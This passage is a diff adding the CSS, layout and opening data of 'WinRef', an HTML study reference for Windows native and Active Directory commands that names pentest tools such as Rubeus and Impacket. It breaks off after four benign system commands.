@@ -1,0 +1,1991 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="light dark">
+<title>Windows Native &amp; AD Command Reference — WinRef</title>
+<script>
+  (function () {
+    try {
+      if (localStorage.getItem('winref-theme') === 'dark') {
+        document.documentElement.setAttribute('data-theme', 'dark');
+      }
+    } catch (e) {}
+  })();
+</script>
+<style>
+  :root{
+    --paper:#fbfaf7;
+    --surface:#ffffff;
+    --sidebar:#f7f5f0;
+    --topbar-bg:rgba(251,250,247,.94);
+    --ink:#1c1917;
+    --body:#44403c;
+    --muted:#78716c;
+    --line:#e7e5e4;
+    --line-soft:#f1efec;
+    --accent:#1d4ed8;
+    --accent-soft:#eef2ff;
+    --accent-line:#dbe4ff;
+    --accent-ink:#3730a3;
+    --ad-accent:#7c3aed;
+    --ad-accent-soft:#f5f3ff;
+    --tools-accent:#0f766e;
+    --tools-accent-soft:#f0fdfa;
+    --cmd-ink:#0f172a;
+    --purpose:#57534e;
+    --row-hover:#f8f9ff;
+    --row-flash:#ecfdf5;
+    --placeholder:#a8a29e;
+    --scroll:#ddd8d0;
+    --ph-bg:#fffbeb;
+    --ph-fg:#b45309;
+    --callout-bg:#fffdf7;
+    --callout-line:#f0e6d2;
+    --callout-accent:#d97706;
+    --badge-both-bg:#eff6ff;--badge-both-fg:#1d4ed8;--badge-both-line:#dbeafe;
+    --badge-req-bg:#f5f3ff;--badge-req-fg:#6d28d9;--badge-req-line:#ede9fe;
+    --badge-warn-bg:#fffbeb;--badge-warn-fg:#b45309;--badge-warn-line:#fde68a;
+    --badge-tool-bg:#f5f5f4;--badge-tool-fg:#57534e;--badge-tool-line:#e7e5e4;
+    --badge-win-bg:#eff6ff;--badge-win-fg:#1d4ed8;--badge-win-line:#dbeafe;
+    --badge-lin-bg:#ecfdf5;--badge-lin-fg:#047857;--badge-lin-line:#a7f3d0;
+    --search-focus:#a5b9f8;
+    --search-ring:rgba(29,78,216,.10);
+    --copy-hover-line:#bfd0f8;
+    --done-bg:#ecfdf5;--done-fg:#047857;--done-line:#a7f3d0;
+    --clear-line:#c7d4fb;--clear-hover:#f5f8ff;
+    --scrim:rgba(28,25,23,.36);
+    --shadow:rgba(28,25,23,.22);
+    --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono","Courier New",monospace;
+    --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    --serif:"Iowan Old Style","Palatino Linotype","Book Antiqua",Palatino,Georgia,serif;
+    --topbar-h:64px;
+    --sidebar-w:284px;
+    color-scheme:light;
+  }
+  html[data-theme="dark"]{
+    --paper:#12100e;
+    --surface:#1a1815;
+    --sidebar:#161310;
+    --topbar-bg:rgba(18,16,14,.94);
+    --ink:#f2efea;
+    --body:#cfcac3;
+    --muted:#a39d95;
+    --line:#302b25;
+    --line-soft:#252019;
+    --accent:#8fb0ff;
+    --accent-soft:#1a2340;
+    --accent-line:#2c3b63;
+    --accent-ink:#c7d6ff;
+    --ad-accent:#c4b5fd;
+    --ad-accent-soft:#241a3d;
+    --tools-accent:#5eead4;
+    --tools-accent-soft:#12312e;
+    --cmd-ink:#f6f4f0;
+    --purpose:#cfc9c1;
+    --row-hover:#1f232b;
+    --row-flash:#122e26;
+    --placeholder:#8f8981;
+    --scroll:#3d3831;
+    --ph-bg:#38280f;
+    --ph-fg:#fbbf24;
+    --callout-bg:#1a1713;
+    --callout-line:#3a3020;
+    --callout-accent:#e0a34a;
+    --badge-both-bg:#172554;--badge-both-fg:#bcd2ff;--badge-both-line:#1e3a8a;
+    --badge-req-bg:#241a3d;--badge-req-fg:#cfc0ff;--badge-req-line:#3b2a63;
+    --badge-warn-bg:#3a2a0e;--badge-warn-fg:#fcd34d;--badge-warn-line:#5c4415;
+    --badge-tool-bg:#262220;--badge-tool-fg:#d6d0c8;--badge-tool-line:#3a342d;
+    --badge-win-bg:#172554;--badge-win-fg:#bcd2ff;--badge-win-line:#1e3a8a;
+    --badge-lin-bg:#0f2e26;--badge-lin-fg:#6ee7b7;--badge-lin-line:#1d5347;
+    --search-focus:#4c6fb8;
+    --search-ring:rgba(143,176,255,.18);
+    --copy-hover-line:#35496f;
+    --done-bg:#0f2e26;--done-fg:#6ee7b7;--done-line:#1d5347;
+    --clear-line:#33477a;--clear-hover:#1b2440;
+    --scrim:rgba(0,0,0,.55);
+    --shadow:rgba(0,0,0,.5);
+    color-scheme:dark;
+  }
+  *{box-sizing:border-box}
+  [hidden]{display:none!important}
+  html{scroll-behavior:auto}
+  body{
+    margin:0;background:var(--paper);color:var(--ink);
+    font-family:var(--sans);font-size:15px;line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+  }
+  a{color:inherit}
+  body,.topbar,.sidebar,.searchwrap,.cmd-list,.workflow,.chapter-count,
+  .clear-btn,.menu-btn,.theme-btn,.toc-link{
+    transition:background-color .2s ease,color .2s ease,border-color .2s ease;
+  }
+
+  /* ---------- top bar ---------- */
+  #progress{
+    position:fixed;top:0;left:0;height:2px;width:0;z-index:100;
+    background:var(--accent);transition:width .08s linear;
+  }
+  .topbar{
+    position:sticky;top:0;z-index:50;height:var(--topbar-h);
+    display:flex;align-items:center;gap:18px;padding:0 22px;
+    background:var(--topbar-bg);
+    -webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--line);
+  }
+  .brand{display:flex;align-items:center;gap:9px;text-decoration:none;flex:none}
+  .logo{
+    width:30px;height:30px;border-radius:8px;background:var(--ink);color:var(--paper);
+    display:grid;place-items:center;font-family:var(--mono);font-size:12px;letter-spacing:-.02em;
+  }
+  .brand-name{font-weight:700;font-size:15px;letter-spacing:-.01em}
+  .brand-sub{font-size:12px;color:var(--muted);border-left:1px solid var(--line);padding-left:10px}
+  .searchwrap{
+    flex:1;min-width:0;max-width:470px;margin:0 auto;
+    display:flex;align-items:center;gap:8px;height:38px;padding:0 12px;
+    border:1px solid var(--line);border-radius:9px;background:var(--surface);
+    transition:border-color .15s,box-shadow .15s;
+  }
+  .searchwrap:focus-within{border-color:var(--search-focus);box-shadow:0 0 0 3px var(--search-ring)}
+  .searchwrap svg{flex:none;color:var(--placeholder)}
+  #q{
+    flex:1;min-width:0;border:0;outline:0;background:transparent;
+    font:14px/1.4 var(--sans);color:var(--ink);
+  }
+  #q::placeholder{color:var(--placeholder)}
+  #q::-webkit-search-decoration,#q::-webkit-search-cancel-button{-webkit-appearance:none}
+  kbd{
+    flex:none;font:11px/1 var(--mono);color:var(--muted);
+    border:1px solid var(--line);border-bottom-width:2px;background:var(--paper);
+    border-radius:4px;padding:2px 5px;
+  }
+  .theme-btn{
+    flex:none;width:36px;height:36px;display:grid;place-items:center;
+    border:1px solid var(--line);background:var(--surface);color:var(--body);
+    border-radius:8px;cursor:pointer;
+    transition:background .15s,color .15s,border-color .15s;
+  }
+  .theme-btn:hover{background:var(--sidebar);color:var(--ink);border-color:var(--muted)}
+  .theme-btn svg{
+    width:16px;height:16px;fill:none;stroke:currentColor;stroke-width:1.8;
+    stroke-linecap:round;stroke-linejoin:round;
+  }
+  .theme-btn .icon-sun{display:none}
+  html[data-theme="dark"] .theme-btn .icon-sun{display:block}
+  html[data-theme="dark"] .theme-btn .icon-moon{display:none}
+  .menu-btn{
+    display:none;flex:none;align-items:center;gap:6px;white-space:nowrap;
+    border:1px solid var(--line);background:var(--surface);color:var(--body);
+    border-radius:8px;padding:8px 11px;font:600 12.5px/1 var(--sans);cursor:pointer;
+  }
+  .menu-btn:hover{background:var(--sidebar)}
+
+  /* ---------- layout ---------- */
+  .sidebar{
+    position:fixed;top:var(--topbar-h);bottom:0;left:0;width:var(--sidebar-w);
+    overflow-y:auto;overscroll-behavior:contain;
+    padding:24px 14px 32px 22px;
+    background:var(--sidebar);border-right:1px solid var(--line);
+  }
+  .sidebar::-webkit-scrollbar{width:8px}
+  .sidebar::-webkit-scrollbar-thumb{background:var(--scroll);border-radius:8px}
+  .drawer-head{display:none}
+  .toc-label{
+    margin:0 0 12px;padding-left:9px;
+    font:700 10.5px/1 var(--sans);letter-spacing:.13em;text-transform:uppercase;color:var(--muted);
+  }
+  .toc-chapter{margin:0 0 2px}
+  .toc-group{margin:0 0 4px}
+  .toc-group + .toc-group{margin-top:20px;padding-top:17px;border-top:1px solid var(--line)}
+  .toc-group-head{
+    display:flex;align-items:center;gap:0;
+    margin:0 0 4px;padding:0 0 0 9px;
+    font:700 9.5px/1.5 var(--sans);letter-spacing:.1em;text-transform:uppercase;
+    color:var(--accent);
+  }
+  .toc-group-link{
+    display:flex;align-items:center;justify-content:space-between;gap:6px;
+    flex:1;min-width:0;color:inherit;text-decoration:none;
+  }
+  .toc-group-link:hover .toc-group-name{text-decoration:underline;text-underline-offset:2px}
+  .toc-group[data-track="ad"] .toc-group-head{color:var(--ad-accent)}
+  .toc-group[data-track="tools"] .toc-group-head{color:var(--tools-accent)}
+  .toc-group[data-track="runbooks"] .toc-group-head{color:var(--muted)}
+  .toc-group-name{display:flex;align-items:center;gap:7px;min-width:0}
+  .toc-group-name::before{
+    content:"";flex:none;width:3px;height:11px;border-radius:2px;
+    background:currentColor;opacity:.75;
+  }
+  .toc-group-head .toc-count,
+  .toc-group-link .toc-count{
+    font:600 10.5px/1 var(--sans);letter-spacing:0;color:currentColor;opacity:.8;
+  }
+  .toc-toggle{
+    flex:none;width:18px;height:18px;display:grid;place-items:center;
+    border:0;border-radius:5px;background:transparent;color:currentColor;
+    cursor:pointer;opacity:.55;padding:0;
+  }
+  .toc-toggle:hover{opacity:1;background:var(--surface)}
+  .toc-toggle::before{
+    content:"▾";display:block;font-size:9px;line-height:1;
+    transition:transform .15s ease;
+  }
+  .toc-group[data-collapsed="true"] .toc-toggle::before{transform:rotate(-90deg)}
+  .toc-group[data-collapsed="true"] .toc-group-body{display:none}
+  .toc-chapter + .toc-chapter{margin-top:2px}
+  .toc-link{
+    display:flex;align-items:center;justify-content:space-between;gap:8px;
+    text-decoration:none;border-radius:7px;color:var(--body);
+  }
+  .chapter-link{
+    padding:7px 9px;font-size:13.5px;font-weight:600;color:var(--ink);
+  }
+  .chapter-link:hover{background:var(--surface)}
+  .toc-count{
+    flex:none;font:500 11px/1 var(--sans);color:var(--muted);
+    font-variant-numeric:tabular-nums;
+  }
+  .toc-subs{list-style:none;margin:0;padding:1px 0 8px}
+  .toc-subs .toc-link{
+    padding:5px 8px 5px 15px;margin-left:9px;
+    font-size:12.7px;border-left:2px solid transparent;border-radius:0 6px 6px 0;
+  }
+  .toc-subs .toc-link:hover{background:var(--surface);color:var(--ink)}
+  .toc-link.active{background:var(--surface);color:var(--accent)}
+  .toc-link.active .toc-count{color:var(--accent)}
+  .toc-subs .toc-link.active{border-left-color:var(--accent);font-weight:600}
+  .chapter-link.current{color:var(--accent)}
+  .side-note{
+    margin:26px 0 0;padding:14px 0 0;border-top:1px solid var(--line);
+    font-size:11.5px;line-height:1.7;color:var(--muted);
+  }
+  .side-note strong{color:var(--body);font-weight:600}
+
+  .main{margin-left:var(--sidebar-w);padding:0 46px 100px}
+  .inner{max-width:1240px;margin:0 auto;padding-top:44px}
+
+  /* ---------- hero ---------- */
+  .eyebrow{
+    margin:0 0 10px;font:700 11px/1.4 var(--mono);
+    letter-spacing:.12em;text-transform:uppercase;color:var(--accent);
+  }
+  .hero h1{
+    margin:0;font-family:var(--serif);font-weight:700;
+    font-size:clamp(31px,4vw,42px);line-height:1.14;letter-spacing:-.02em;
+  }
+  .lead{margin:15px 0 0;max-width:66ch;font-size:16.5px;line-height:1.65;color:var(--body)}
+  .hero-meta{
+    display:flex;flex-wrap:wrap;gap:10px 24px;margin-top:20px;
+    font-size:12.5px;color:var(--muted);
+  }
+  .hero-meta span{display:flex;align-items:baseline;gap:6px}
+  .hero-meta strong{font-size:16px;color:var(--ink);font-weight:700;font-variant-numeric:tabular-nums}
+  .hero-hints{
+    display:flex;flex-wrap:wrap;gap:8px 20px;margin-top:22px;
+    font-size:12.5px;color:var(--muted);
+  }
+  .hero-hints span{display:flex;align-items:center;gap:7px}
+  .hero-hints .dot{width:4px;height:4px;border-radius:50%;background:var(--scroll)}
+
+  /* ---------- track cards ---------- */
+  .hero-tracks{
+    display:grid;grid-template-columns:repeat(auto-fit,minmax(238px,1fr));gap:12px;
+    margin-top:26px;max-width:1010px;
+  }
+  .track-card{
+    display:flex;flex-direction:column;gap:4px;
+    padding:15px 17px;border:1px solid var(--line);border-radius:11px;
+    background:var(--surface);text-decoration:none;
+    transition:border-color .15s,background .15s;
+  }
+  .track-card:hover{border-color:var(--accent);background:var(--accent-soft)}
+  .track-card[data-track="ad"]:hover{border-color:var(--ad-accent);background:var(--ad-accent-soft)}
+  .track-card[data-track="tools"]:hover{border-color:var(--tools-accent);background:var(--tools-accent-soft)}
+  .track-tag{
+    font:700 9.5px/1.4 var(--sans);letter-spacing:.13em;text-transform:uppercase;
+    color:var(--accent);
+  }
+  .track-card[data-track="ad"] .track-tag{color:var(--ad-accent)}
+  .track-card[data-track="tools"] .track-tag{color:var(--tools-accent)}
+  .track-card strong{font-size:14.5px;letter-spacing:-.01em}
+  .track-card p{margin:0;font-size:12.3px;line-height:1.5;color:var(--muted)}
+  .track-meta{
+    margin-top:7px;font:600 11px/1 var(--sans);color:var(--body);
+    font-variant-numeric:tabular-nums;
+  }
+
+  /* ---------- search status ---------- */
+  .search-status{
+    display:flex;align-items:center;justify-content:space-between;gap:14px;
+    margin:22px 0 0;padding:10px 14px;border:1px solid var(--accent-line);
+    border-radius:9px;background:var(--accent-soft);font-size:13px;color:var(--accent);
+  }
+  .search-status strong{font-variant-numeric:tabular-nums}
+  .clear-btn{
+    flex:none;border:1px solid var(--clear-line);background:var(--surface);color:var(--accent);
+    border-radius:7px;padding:5px 10px;font:600 12px/1 var(--sans);cursor:pointer;
+  }
+  .clear-btn:hover{background:var(--clear-hover)}
+  body.searching .hero{display:none}
+  body.searching .chapter{margin-top:30px}
+  body.searching .chapter .lead,
+  body.searching .tip,
+  body.searching .sec-note{display:none}
+  body.searching .section{margin-top:22px}
+
+  /* ---------- chapters ---------- */
+  .chapter{margin-top:62px;scroll-margin-top:calc(var(--topbar-h) + 18px)}
+  .chapter h2{
+    margin:0;font-family:var(--serif);font-weight:700;
+    font-size:31px;line-height:1.2;letter-spacing:-.018em;
+    display:flex;align-items:baseline;flex-wrap:wrap;gap:10px 12px;
+  }
+  .chapter-count{
+    font:600 11.5px/1.4 var(--sans);color:var(--muted);
+    border:1px solid var(--line);background:var(--surface);border-radius:999px;padding:3px 10px;
+    letter-spacing:.01em;
+  }
+  .chapter .lead{font-size:15.5px;margin-top:12px}
+  .tip{
+    margin-top:18px;padding:11px 15px;
+    background:var(--accent-soft);border-left:3px solid var(--accent);
+    border-radius:0 8px 8px 0;font-size:13px;line-height:1.6;color:var(--accent-ink);
+  }
+  .tip strong{
+    display:inline-block;margin-right:7px;
+    font:700 10px/1.4 var(--sans);letter-spacing:.1em;text-transform:uppercase;
+  }
+
+  .section{margin-top:34px;scroll-margin-top:calc(var(--topbar-h) + 18px)}
+  .sec-head{display:flex;align-items:baseline;gap:10px}
+  .sec-head h3{
+    margin:0;font-size:16.5px;font-weight:650;letter-spacing:-.012em;
+  }
+  .sec-count{
+    font:500 11.5px/1 var(--sans);color:var(--muted);
+    font-variant-numeric:tabular-nums;
+  }
+  .sec-note{margin:5px 0 0;font-size:12.7px;color:var(--muted);max-width:72ch}
+
+  .cmd-list{
+    margin-top:11px;border:1px solid var(--line);border-radius:10px;
+    background:var(--surface);overflow:hidden;
+  }
+  .cmd-row{
+    padding:12px 15px;border-top:1px solid var(--line-soft);
+    cursor:pointer;transition:background .12s;
+  }
+  .cmd-row:first-child{border-top:0}
+  .cmd-row:hover{background:var(--row-hover)}
+  .cmd-row.flash{background:var(--row-flash)}
+  .cmd-head{display:flex;align-items:flex-start;justify-content:space-between;gap:14px}
+  .cmd{
+    font-family:var(--mono);font-size:13.5px;line-height:1.55;
+    color:var(--cmd-ink);font-weight:500;overflow-wrap:anywhere;
+  }
+  .copy-btn{
+    flex:none;border:1px solid var(--line);background:var(--surface);color:var(--muted);
+    border-radius:6px;padding:3px 9px;font:500 11.5px/1.4 var(--sans);cursor:pointer;
+    transition:color .12s,border-color .12s,background .12s;
+  }
+  .copy-btn:hover{color:var(--accent);border-color:var(--copy-hover-line);background:var(--accent-soft)}
+  .copy-btn.done{color:var(--done-fg);border-color:var(--done-line);background:var(--done-bg)}
+  .purpose{margin:4px 0 0;font-size:13px;line-height:1.55;color:var(--purpose);max-width:82ch}
+  .ph{font-family:var(--mono);color:var(--ph-fg);background:var(--ph-bg);border-radius:3px;padding:0 2px}
+
+  .badges{display:flex;flex-wrap:wrap;gap:5px;margin-top:7px}
+  .badge{
+    font-size:10.5px;line-height:1.5;padding:1.5px 7px;border-radius:999px;
+    border:1px solid;white-space:nowrap;
+  }
+  .badge.both{color:var(--badge-both-fg);background:var(--badge-both-bg);border-color:var(--badge-both-line)}
+  .badge.req{color:var(--badge-req-fg);background:var(--badge-req-bg);border-color:var(--badge-req-line)}
+  .badge.warn{color:var(--badge-warn-fg);background:var(--badge-warn-bg);border-color:var(--badge-warn-line)}
+  .badge.tool{color:var(--badge-tool-fg);background:var(--badge-tool-bg);border-color:var(--badge-tool-line)}
+  .badge.os-win{color:var(--badge-win-fg);background:var(--badge-win-bg);border-color:var(--badge-win-line)}
+  .badge.os-linux{color:var(--badge-lin-fg);background:var(--badge-lin-bg);border-color:var(--badge-lin-line)}
+
+  /* ---------- tool index ---------- */
+  .ref-wrap{
+    margin-top:14px;border:1px solid var(--line);border-radius:10px;
+    background:var(--surface);overflow:hidden;
+  }
+  .ref-scroll{overflow-x:auto}
+  .ref-table{width:100%;border-collapse:collapse;font-size:13px}
+  .ref-table th{
+    text-align:left;padding:9px 14px;background:var(--sidebar);
+    font:700 10px/1.4 var(--sans);letter-spacing:.1em;text-transform:uppercase;
+    color:var(--muted);white-space:nowrap;
+  }
+  .ref-table td{padding:9px 14px;border-top:1px solid var(--line-soft);vertical-align:top}
+  .ref-row:hover{background:var(--row-hover)}
+  .ref-name{font-weight:650;color:var(--ink);white-space:nowrap}
+  .ref-desc{color:var(--purpose);min-width:220px}
+  .ref-os{white-space:nowrap}
+  .ref-os span{
+    font-size:10.5px;line-height:1.5;padding:1.5px 7px;border-radius:999px;border:1px solid;
+  }
+  .ref-os .os-win{color:var(--badge-win-fg);background:var(--badge-win-bg);border-color:var(--badge-win-line)}
+  .ref-os .os-linux{color:var(--badge-lin-fg);background:var(--badge-lin-bg);border-color:var(--badge-lin-line)}
+  .ref-os .os-both{color:var(--badge-tool-fg);background:var(--badge-tool-bg);border-color:var(--badge-tool-line)}
+  .ref-count{font-size:12px;color:var(--muted);margin-top:8px}
+
+  /* ---------- workflows ---------- */
+  .workflow{
+    border:1px solid var(--line);border-radius:12px;background:var(--surface);
+    padding:18px 20px;margin-top:18px;
+  }
+  .wf-head{display:flex;align-items:flex-start;justify-content:space-between;gap:16px}
+  .wf-head h3{margin:0 0 3px;font-size:16px;font-weight:650;letter-spacing:-.012em}
+  .wf-head p{margin:0;font-size:12.7px;color:var(--muted)}
+  .wf-list{list-style:none;margin:13px 0 0;padding:0;counter-reset:step}
+  .wf-step{
+    display:flex;align-items:center;gap:10px;padding:7px 6px;
+    border-top:1px dashed var(--line-soft);counter-increment:step;
+    border-radius:6px;cursor:pointer;
+  }
+  .wf-step:hover{background:var(--row-hover)}
+  .wf-step.flash{background:var(--row-flash)}
+  .wf-step::before{
+    content:counter(step);flex:none;width:20px;text-align:right;
+    font:11px/1 var(--mono);color:var(--placeholder);
+  }
+  .wf-step code{flex:1;min-width:0;font-family:var(--mono);font-size:12.8px;overflow-wrap:anywhere}
+  .wf-step .copy-btn{padding:2px 8px;font-size:11px}
+
+  /* ---------- empty / notes / footer ---------- */
+  .empty{padding:64px 0 40px;text-align:center;color:var(--muted)}
+  .empty p{margin:0 0 14px;font-size:14px}
+  .empty button{
+    border:1px solid var(--line);background:var(--surface);color:var(--body);
+    border-radius:8px;padding:8px 14px;font:500 13px/1.3 var(--sans);cursor:pointer;
+  }
+  .empty button:hover{background:var(--sidebar)}
+
+  .safety{margin-top:70px;padding-top:34px;border-top:1px solid var(--line);scroll-margin-top:calc(var(--topbar-h) + 18px)}
+  .safety h2{font-size:26px}
+  .callout{
+    margin-top:16px;padding:16px 20px;
+    background:var(--callout-bg);border:1px solid var(--callout-line);border-left:3px solid var(--callout-accent);
+    border-radius:0 10px 10px 0;
+  }
+  .callout ul{margin:0;padding-left:19px}
+  .callout li{margin:6px 0;font-size:13px;line-height:1.6;color:var(--purpose)}
+
+  .foot{
+    margin-top:46px;padding-top:20px;border-top:1px solid var(--line);
+    font-size:12px;color:var(--muted);
+  }
+  .foot code{font-family:var(--mono);font-size:11.5px}
+
+  /* ---------- mobile ---------- */
+  .scrim{display:none}
+  @media (max-width:1000px){
+    .sidebar{
+      top:0;z-index:80;width:304px;padding:18px 14px 32px 18px;
+      transform:translateX(-102%);transition:transform .22s ease;
+      box-shadow:0 0 44px var(--shadow);
+    }
+    .sidebar.open{transform:none}
+    .drawer-head{
+      display:flex;align-items:center;justify-content:space-between;
+      margin:0 0 16px;padding:0 4px 12px;border-bottom:1px solid var(--line);
+      font-weight:700;font-size:14px;
+    }
+    .drawer-close{
+      border:0;background:transparent;font-size:22px;line-height:1;
+      color:var(--muted);cursor:pointer;padding:0 4px;
+    }
+    .scrim{display:block;position:fixed;inset:0;z-index:70;background:var(--scrim)}
+    .main{margin-left:0;padding:0 22px 80px}
+    .inner{padding-top:34px}
+    .menu-btn{display:inline-flex}
+    .brand-sub{display:none}
+    .toc-label{display:none}
+  }
+  @media (max-width:640px){
+    .topbar{gap:10px;padding:0 14px}
+    .brand-name{display:none}
+    .searchwrap kbd{display:none}
+    .hero-hints{gap:6px 0}
+    .hero-hints .dot{display:none}
+    .hero-hints span{flex-basis:100%}
+    .hero-tracks{grid-template-columns:1fr;margin-top:20px}
+    .main{padding:0 16px 70px}
+    .hero h1{font-size:29px}
+    .chapter{margin-top:48px}
+    .chapter h2{font-size:26px}
+    .cmd-row{padding:11px 13px}
+    .cmd{font-size:12.8px}
+    .workflow{padding:15px 16px}
+    .wf-head{flex-wrap:wrap;gap:10px}
+  }
+
+  /* ---------- print ---------- */
+  .print-head{display:none}
+  @media print{
+    @page{margin:14mm}
+    :root,html[data-theme="dark"]{
+      --paper:#fff;--surface:#fff;--sidebar:#fff;--topbar-bg:#fff;
+      --ink:#000;--body:#222;--muted:#555;--line:#ccc;--line-soft:#e5e5e5;
+      --accent:#1d4ed8;--accent-soft:#f5f5f5;--accent-line:#ddd;--accent-ink:#333;
+      --cmd-ink:#000;--purpose:#333;--row-hover:#fff;--row-flash:#fff;
+      --ph-bg:transparent;--ph-fg:#8a4b00;
+      --callout-bg:#fff;--callout-line:#ddd;--callout-accent:#999;
+      --badge-both-bg:#fff;--badge-both-fg:#333;--badge-both-line:#ccc;
+      --badge-req-bg:#fff;--badge-req-fg:#333;--badge-req-line:#ccc;
+      --badge-warn-bg:#fff;--badge-warn-fg:#333;--badge-warn-line:#ccc;
+    }
+    body{background:#fff;font-size:11px}
+    #progress,.topbar,.sidebar,.scrim,.search-status,.search-status+.empty,
+    .copy-btn,.menu-btn,.theme-btn,.hero-hints,.empty{display:none!important}
+    .print-head{display:block;margin-bottom:16px}
+    .print-head h1{font-family:var(--serif);font-size:18pt;margin:0 0 4px}
+    .print-head p{margin:0;font-size:9pt;color:#555}
+    .main{margin:0;padding:0}
+    .inner{max-width:none;padding:0}
+    .chapter{margin-top:20px;page-break-inside:auto}
+    .chapter h2{font-size:15pt;margin-top:12px}
+    .chapter .lead,.tip,.sec-note{font-size:9pt}
+    .hero{display:none}
+    .tip{background:#f5f5f5;border-left-color:#999;color:#333;padding:6px 10px}
+    .section{margin-top:14px}
+    .sec-head h3{font-size:10.5pt}
+    .cmd-list{border-color:#ddd}
+    .cmd-row{break-inside:avoid;page-break-inside:avoid;padding:5px 9px}
+    .cmd{font-size:10pt}
+    .purpose{font-size:8.5pt;margin-top:1px}
+    .badges{gap:4px;margin-top:2px}
+    .badge{border-color:#ccc;color:#444;background:#fff!important;font-size:7pt}
+    .ref-wrap{border-color:#ddd;break-inside:auto}
+    .ref-table{font-size:8.5pt}
+    .ref-table th{background:#f5f5f5;color:#333;padding:4px 8px}
+    .ref-table td{padding:4px 8px;border-color:#e5e5e5}
+    .ref-name,.ref-desc{color:#000}
+    .ref-os span{border-color:#ccc;color:#444;background:#fff!important}
+    .ph{background:none;color:#8a4b00;padding:0}
+    .workflow{break-inside:avoid;page-break-inside:avoid;margin-top:10px;padding:9px 12px}
+    .wf-head h3{font-size:11pt}
+    .wf-step{padding:3px 4px}
+    .wf-step code{font-size:9pt}
+    .safety{margin-top:20px;padding-top:10px}
+    .callout{background:#fff;border-color:#ddd;border-left-color:#999}
+    .callout li{font-size:8.5pt}
+    .foot{font-size:8pt}
+  }
+</style>
+</head>
+<body>
+
+<div id="progress" aria-hidden="true"></div>
+
+<div class="print-head">
+  <h1>Windows Native &amp; Active Directory Command Reference</h1>
+  <p>CMD &middot; PowerShell &middot; WMI / CIM &middot; Active Directory &middot; AD Toolkit &mdash; study reference and cheat sheet</p>
+</div>
+
+<header class="topbar">
+  <a class="brand" href="#hero">
+    <span class="logo" aria-hidden="true">&gt;_</span>
+    <span class="brand-name">WinRef</span>
+    <span class="brand-sub">Windows &amp; AD command reference</span>
+  </a>
+
+  <div class="searchwrap">
+    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+      <circle cx="11" cy="11" r="7"></circle><path d="m20 20-3.5-3.5"></path>
+    </svg>
+    <input id="q" type="search" placeholder="Search commands…" autocomplete="off" spellcheck="false" aria-label="Search commands">
+    <kbd>/</kbd>
+  </div>
+
+  <button class="theme-btn" id="themeBtn" type="button" aria-label="Switch to dark theme" title="Switch to dark theme">
+    <svg class="icon-moon" viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path>
+    </svg>
+    <svg class="icon-sun" viewBox="0 0 24 24" aria-hidden="true">
+      <circle cx="12" cy="12" r="4"></circle>
+      <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path>
+    </svg>
+  </button>
+
+  <button class="menu-btn" id="menuBtn" type="button" aria-expanded="false" aria-controls="sidebar">Contents</button>
+</header>
+
+<aside class="sidebar" id="sidebar" aria-label="Contents">
+  <div class="drawer-head">
+    <span>Contents</span>
+    <button class="drawer-close" id="closeMenu" type="button" aria-label="Close contents">&times;</button>
+  </div>
+  <div id="toc"></div>
+  <p class="side-note">
+    <strong id="sideTotal">269 commands</strong><br>
+    <span id="sideBreak">52 Windows native · 14 AD · 203 toolkit</span><br>
+    Single file &middot; works offline<br>
+    Click any command to copy it.
+  </p>
+</aside>
+<div class="scrim" id="scrim" hidden></div>
+
+<main class="main">
+  <div class="inner" id="top">
+
+    <section class="hero" id="hero">
+      <p class="eyebrow">Study reference &middot; Windows &amp; Active Directory</p>
+      <h1>Windows Native &amp; Active Directory<br>Command Reference</h1>
+      <p class="lead">
+        A copy-first guide in three tracks: the commands built into every Windows install, the native
+        commands that talk to Active Directory, and the third-party toolkit &mdash; PowerView, Rubeus,
+        Impacket and friends &mdash; split by Windows and Linux. Each chapter explains what a group of
+        commands is for and when to reach for it, then gives you the exact syntax: one click puts it on
+        your clipboard.
+      </p>
+      <div class="hero-meta">
+        <span><strong id="heroCmdCount">269</strong> commands</span>
+        <span><strong id="heroChCount">14</strong> chapters</span>
+        <span><strong id="heroTrackCount">3</strong> command tracks</span>
+        <span><strong>0</strong> dependencies</span>
+      </div>
+      <div class="hero-tracks" id="heroTracks"></div>
+      <div class="hero-hints">
+        <span>Search with <kbd>/</kbd></span>
+        <span class="dot" aria-hidden="true"></span>
+        <span>Click a command to copy</span>
+        <span class="dot" aria-hidden="true"></span>
+        <span>Jump with the contents panel</span>
+      </div>
+    </section>
+
+    <div class="search-status" id="searchStatus" hidden>
+      <span id="searchStatusText"></span>
+      <button class="clear-btn" id="clearSearch" type="button">Clear search</button>
+    </div>
+
+    <div id="chapters"></div>
+
+    <div class="empty" id="empty" hidden>
+      <p id="emptyText">No commands match that search.</p>
+      <button type="button" id="emptyReset">Clear search</button>
+    </div>
+
+    <section class="chapter safety" id="notes" data-spy>
+      <p class="eyebrow">Read before you run</p>
+      <h2>Safety &amp; scope</h2>
+      <div class="callout">
+        <ul id="notesList"></ul>
+      </div>
+    </section>
+
+    <footer class="foot">
+      Compiled from <code>Windows_Native_Commands.txt</code>, <code>Windows_Native_AD_Command_Reference.txt</code>
+      and <code>Tools of the Trade.txt</code>
+      &middot; single-file site, no tracking, no network calls.
+      Use only on systems you own or are explicitly authorized to assess.
+    </footer>
+  </div>
+</main>
+
+<script>
+/* DATA-START */
+const COMMANDS = [
+  /* ---- CMD: System & Identity ---- */
+  {tabs:['cmd'], section:'System & Identity', cmd:'whoami', purpose:'Display the current user.'},
+  {tabs:['cmd'], section:'System & Identity', cmd:'whoami /all', purpose:'Show user, groups, SIDs, and privileges.'},
+  {tabs:['cmd'], section:'System & Identity', cmd:'hostname', purpose:'Display the computer name.'},
+  {tabs:['cmd'], section:'System & Identity', cmd:'ver', purpose:'Display the Windows version.'},
